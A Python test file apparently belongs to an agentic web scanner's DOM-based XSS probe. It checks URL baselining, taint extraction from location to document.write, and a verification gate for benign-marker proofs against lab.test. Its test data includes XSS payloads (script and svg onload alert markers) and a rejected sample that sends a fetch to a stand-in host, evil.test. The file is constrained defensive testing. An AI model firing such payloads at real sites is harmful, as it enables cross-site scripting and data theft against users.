from tools.agentic_browser_dom_probe import (
    BrowserDomProbeTool,
    build_baseline_url,
    build_nuclei_finding,
    extract_taint_candidates,
    validate_benign_marker_target,
    verification_is_confirmed,
)


def _proof(**overrides):
    proof = {
        "browserExecuted": True,
        "fallback": False,
        "markerMatched": True,
        "solvedBefore": False,
        "solvedAfter": True,
        "linkedSourceSink": True,
        "sourceCandidates": [{"kind": "location", "script": "inline:0"}],
        "sinkCandidates": [{"kind": "document.write", "script": "inline:0"}],
    }
    proof.update(overrides)
    return proof


def test_tool_registration_and_schema_are_single_poc_only():
    tool = BrowserDomProbeTool()

    assert tool.name == "browser:dom_probe"
    assert tool.metadata["category"] == "exploit-test"
    assert tool.metadata["phase"] == 4
    assert tool.schema["required"] == ["parameter"]
    assert "actions" not in tool.schema["properties"]
    assert "script" not in tool.schema["properties"]


def test_build_baseline_removes_only_payload_parameter_and_fragment():
    target = "https://lab.test/product?productId=1&storeId=%3Cscript%3Ealert(1337)%3C/script%3E#payload"

    assert build_baseline_url(target, "storeId") == "https://lab.test/product?productId=1"


def test_marker_validation_accepts_benign_alert_or_confirm():
    alert_ok = validate_benign_marker_target(
        "https://lab.test/?q=%3Csvg%20onload%3Dalert(1337)%3E",
        "1337",
    )
    confirm_ok = validate_benign_marker_target(
        "https://lab.test/?q=%3Csvg%20onload%3Dconfirm%281337%29%3E",
        "1337",
    )

    assert alert_ok == (True, "")
    assert confirm_ok == (True, "")


def test_marker_validation_rejects_missing_marker_non_http_and_exfiltration():
    assert validate_benign_marker_target("https://lab.test/?q=test", "1337")[0] is False
    assert validate_benign_marker_target("javascript:alert(1337)", "1337")[0] is False
    unsafe = validate_benign_marker_target(
        "https://lab.test/?q=%3Cscript%3Efetch('https://evil.test')%3Balert(1337)%3C/script%3E",
        "1337",
    )
    assert unsafe[0] is False
    assert "network fetch" in unsafe[1]


def test_taint_extraction_requires_source_and_sink_in_same_script_and_is_bounded():
    taint = extract_taint_candidates(
        [
            {
                "url": "inline:0",
                "text": "const value = new URLSearchParams(location.search).get('storeId');\n"
                "document.write('<option>' + value + '</option>');",
            },
            {"url": "inline:1", "text": "element.innerHTML = trusted;"},
        ]
    )

    assert taint["linkedSourceSink"] is True
    assert taint["linkedScripts"] == ["inline:0"]
    assert taint["sourceCandidates"][0]["kind"] == "location"
    assert taint["sinkCandidates"][0]["kind"] == "document.write"
    assert all(len(item["excerpt"]) <= 220 for item in taint["sourceCandidates"] + taint["sinkCandidates"])


def test_taint_extraction_does_not_link_unrelated_scripts():
    taint = extract_taint_candidates(
        [
            {"url": "source.js", "text": "const input = location.search;"},
            {"url": "sink.js", "text": "element.innerHTML = trusted;"},
        ]
    )

    assert taint["sourceCandidates"]
    assert taint["sinkCandidates"]
    assert taint["linkedSourceSink"] is False


def test_taint_extraction_prioritizes_actionable_linked_location_write_pair():
    taint = extract_taint_candidates(
        [
            {
                "url": "lab-header.js",
                "text": "socket.onmessage = function (event) {\n"
                "  setTimeout(function () { panel.innerHTML = event.data; }, 10);\n"
                "};",
            },
            {
                "url": "inline:2",
                "text": "const value = new URLSearchParams(location.search).get('storeId');\n"
                "document.write('<option>' + value + '</option>');",
            },
        ]
    )

    assert taint["sourceCandidates"][0]["kind"] == "location"
    assert taint["sinkCandidates"][0]["kind"] == "document.write"
    assert taint["sourceCandidates"][0]["script"] == taint["sinkCandidates"][0]["script"]


def test_verification_gate_requires_fresh_browser_linkage_and_execution_proof():
    assert verification_is_confirmed(_proof()) is True
    assert verification_is_confirmed(_proof(markerMatched=False, solvedAfter=True)) is True
    assert verification_is_confirmed(_proof(markerMatched=False, solvedAfter=False)) is False
    assert verification_is_confirmed(_proof(solvedBefore=True)) is False
    assert verification_is_confirmed(_proof(fallback=True)) is False
    assert verification_is_confirmed(_proof(linkedSourceSink=False)) is False
    assert verification_is_confirmed(_proof(sourceCandidates=[])) is False


def test_finding_shape_carries_only_typed_browser_proof():
    proof = _proof(parameter="storeId", expectedMarker="1337")
    finding = build_nuclei_finding("https://lab.test/product?productId=1", proof)

    assert finding["template-id"] == "xasm-dom-based-browser-verified"
    assert finding["matched-at"].startswith("https://lab.test/")
    assert finding["matcher-name"] == "browser-executed-dom-marker"
    assert finding["info"]["classification"]["cwe-id"] == ["CWE-79"]
    assert finding["evidence"] is proof
